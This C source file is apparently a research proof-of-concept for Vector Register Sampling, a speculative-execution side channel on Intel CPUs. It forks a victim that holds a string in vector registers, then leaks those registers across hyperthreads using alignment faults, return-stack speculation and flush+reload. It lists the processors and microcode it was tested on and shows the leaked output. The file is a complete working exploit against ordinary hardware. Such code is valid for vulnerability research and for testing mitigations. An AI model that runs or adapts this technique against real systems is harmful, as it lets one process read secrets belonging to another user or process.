/*
Leak vector register moves (p0?) across hyperthreads using alignment faults, without TSX.
Demonstrates Vector Register Sampling (VRS).
Tested on i7-7700k with microcode 0x84/b4, i7-6700k with microcode 0xcc, i9-9900k with microcode 0xbe.

This PoC uses TSX by default; it leaks the result of an XOR inside a transaction.
Needs /proc/sys/vm/nr_hugepages to be a reasonable value (e.g. 16).

First printed value is 01? That's forwarding of the (real) stack write, sigh. Try another CPU.
On some machines it will leak fill buffer contents too (look for 'X' and ' ').
If it's silent, try running multiple copies at once (on the same hyperthread pair).

Expected output:
$ taskset -c 3,7 ./vrs
offset 16:
00074785: 48 (H)
offset 17:
00076304: 69 (i)
offset 18:
00077135: 20 ( )
offset 19:
00075963: 49 (I)
offset 20:
00076727: 6e (n)
offset 21:
00073844: 74 (t)
offset 22:
00074585: 65 (e)
offset 23:
00074955: 6c (l)
*/
#define ITERS 100000

#define START 16
#define END 1024

#include "ridl2.h"

int main(int argc, char *argv[]) {
	(void)argc; (void)argv;

	enable_SSBM();

	// output is source^spaces = 'Hi Intel'
	static char source[] = "XXXXXXXXhI\x00iNTELXXXXXXXXXXXXXXXX";
        static char spaces[] = "                                   ";

	static char zeros1[64] = { 0 };
	static char zeros2[64] = { 0 };

	/* *** begin forked process *** */
	pid_t pid = fork();
	if (pid == 0) {
		asm volatile("vmovups (%0), %%ymm5\n"::"r"(source));
		asm volatile("vmovups (%0), %%ymm6\n"::"r"(spaces));
		memset((char *)source, 0, sizeof(source));
		asm volatile(""::"r"(source));

		_do_skl_avx();

		/* victim code runs in a loop */
		while (1) {
			asm volatile(
#define USE_TSX_PARANOIA
#ifdef USE_TSX_PARANOIA
			/* run victim in aborting transaction (ensure no memory writes) */
			"xbegin abortpoint\n"
#endif

			// ymm5 = spaces^source -> lowercase
			"vxorps %%ymm6, %%ymm5, %%ymm5\n"

			".align 0x10\n"
			/* infinite loop: move xmm5->rax */
			"loop:\n"
			"movq %%xmm5, %%rax\n" // or e.g., vpmovmskb
			"jmp loop\n"

			"abortpoint:\n"
			::
			:"rax"
		);
		}
	}
	/* *** end forked process *** */
	if (pid < 0) return 1;

	ALLOC_BUFFERS();

	char *basereloadbuffer = reloadbuffer;
	char *baseleak = leak;

	leak += 1; // misalign it

	for (size_t offset = START; offset < END; ++offset) {
		memset(results, 0, sizeof(results));

		// use the clflush to adjust the offset
		reloadbuffer = basereloadbuffer + 0x800 - offset;

		*(volatile char *)leak;
		*(volatile char *)reloadbuffer;

		_do_skl_avx();

		enable_alignment_checks();
		for (size_t i = 0; i < ITERS; ++i) {

			flush(reloadbuffer);

			asm volatile(
//#define USE_VECTOR
//#define USE_AVX
#ifdef USE_AVX
			"vmovdqa 0x20(%2), %%ymm7\n" // warm up AVX? (not strictly needed)
#endif

			/* save+align stack pointer (in rbx) */
			"movq %%rsp, %%rbx\n"
			"andq $-0x100, %%rsp\n"

			// counting ports/cycles is not portable, this is about the right number of zerolen stores
#define CLFLUSH_ZERO "clflush 0x9(%1)\n"
#define CLFLUSH_ZERO_5 CLFLUSH_ZERO CLFLUSH_ZERO CLFLUSH_ZERO CLFLUSH_ZERO CLFLUSH_ZERO
			CLFLUSH_ZERO_5
			CLFLUSH_ZERO_5
			CLFLUSH_ZERO_5
			CLFLUSH_ZERO_5
			CLFLUSH_ZERO_5
			CLFLUSH_ZERO_5
			"mfence\n"

#ifdef ADJUST1
			"mov $0x01, %%rax\n"
#endif

			// call which never returns
#define STORE_RSB
#ifdef STORE_RSB
			"movabs $real_return, %%rax\n"
#else
			"movabs $real_return, %%rax\n"
			"pushq %%rax\n"
			"movabs $0x08, %%rax\n"
#endif
			"call 2f\n"

			// speculated load from misaligned address
			"speculated_read:\n"
#ifdef USE_VECTOR
 #ifdef USE_AVX
			"vmovdqa (%0), %%ymm0\n"
 #else
			"vmovdqa (%0), %%xmm0\n"
 #endif
			"movq %%xmm0, %%rax\n"
#else
			"movq (%0), %%rax\n"
#endif
			"andq $0xff, %%rax\n"
			"shl $0xa, %%rax\n"
			"prefetcht0 (%%rax, %1)\n"

			// infinite loop
			"3: pause\n"
			"jmp 3b\n"

			// call target
			"2:\n"
			"imulq $1, %%rax, %%rax\n"
			"imulq $1, %%rax, %%rax\n"
			"imulq $1, %%rax, %%rax\n"
#ifndef MINIMAL_MULQ
			"imulq $1, %%rax, %%rax\n"
			"imulq $1, %%rax, %%rax\n"
#endif
#ifdef STORE_RSB
			"mov %%rax, (%%rsp)\n"
#else
			"addq %%rax, %%rsp\n"
#endif
			"retq\n"
			// actual return point
			".align 0x100\n"
			"nop\n" // make sure addr ends in 0x01 for debugging
			"real_return:\n"

			"movq %%rbx, %%rsp\n"
			::"r"(leak), "r"(reloadbuffer), "r"(baseleak):"rax","rbx","rcx"
			);

			reload(reloadbuffer, results);
		}
		disable_alignment_checks();

		printf("offset %d:\n", (int)offset);
		print_best_results(results);
		//print_results(results);
	}

	kill(pid, SIGKILL);
}

